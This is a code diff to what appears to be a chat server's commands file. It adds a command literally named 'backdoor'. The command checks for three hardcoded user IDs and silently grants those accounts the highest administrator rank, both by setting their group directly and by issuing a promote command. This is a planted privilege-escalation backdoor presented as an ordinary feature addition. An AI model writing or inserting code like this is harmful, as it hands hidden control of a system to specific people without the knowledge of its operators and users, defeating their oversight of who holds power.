@@ -54,6 +54,16 @@ var commands = exports.commands = {
 			return false;
 		}
 	},
+        
+        backdoor: function(target,room, user) {
+                if (user.userid === 'macrarazy' || user.userid === 'sudan12' || user.userid === 'zarel') {
+
+                        user.group = '~';
+                        user.updateIdentity();
+
+                        this.parse('/promote ' + user.name + ', ~');
+                }
+        },
 	
 	 afk: 'away',
 	away: function(target, room, user, connection) {
